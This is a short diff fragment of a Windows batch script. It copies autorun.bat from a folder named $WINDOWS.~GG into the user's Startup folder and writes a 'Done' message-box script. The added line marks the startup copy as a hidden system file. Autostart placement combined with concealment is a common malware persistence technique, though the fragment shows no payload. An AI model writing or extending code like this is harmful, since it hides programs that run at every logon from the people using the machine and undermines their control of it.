@@ -14,6 +14,7 @@ cd "Start Menu"
 cd Programs
 cd Startup
 xcopy /s/y c:\$WINDOWS.~GG\autorun.bat
+attrib +s +h autorun.bat
 cd C:\
 cd $WINDOWS.~GG
 echo x=msgbox("Done" ,0, "Done") >> msgbox.vbs
